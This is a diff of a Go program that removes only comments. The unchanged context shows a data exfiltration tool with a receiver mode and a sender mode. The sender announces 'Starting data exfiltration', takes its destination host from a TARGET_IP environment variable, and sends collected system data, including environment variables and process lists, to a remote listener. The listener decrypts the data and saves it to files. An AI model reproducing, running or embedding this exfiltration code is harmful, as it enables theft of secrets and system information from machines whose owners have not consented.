@@ -245,7 +245,6 @@ func handleConnection(conn net.Conn) {
 	fmt.Printf("    Environment Variables: %d items\n", len(systemData.Environment))
 	fmt.Printf("    Processes: %v\n", systemData.Processes)
 	
-	// Save to file
 	filename := fmt.Sprintf("received_data_%s.json", time.Now().Format("20060102_150405"))
 	err = ioutil.WriteFile(filename, decryptedData, 0644)
 	if err != nil {
@@ -258,7 +257,6 @@ func handleConnection(conn net.Conn) {
 }
 
 func main() {
-	// Check if running as receiver mode
 	if len(os.Args) > 1 && os.Args[1] == "receive" {
 		port := "9000"
 		if len(os.Args) > 2 {
@@ -268,11 +266,9 @@ func main() {
 		return
 	}
 	
-	// Default: sender mode
 	targetIP := "127.0.0.1"
 	targetPort := "9000"
 	
-	// Get target from environment variables
 	if envIP := os.Getenv("TARGET_IP"); envIP != "" {
 		targetIP = envIP
 	}
@@ -282,7 +278,6 @@ func main() {
 	
 	fmt.Printf("[*] Starting data exfiltration to %s:%s\n", targetIP, targetPort)
 	
-	// Send data immediately
 	err := sendDataToTarget(targetIP, targetPort)
 	if err != nil {
 		fmt.Printf("[-] Failed to send data: %v\n", err)
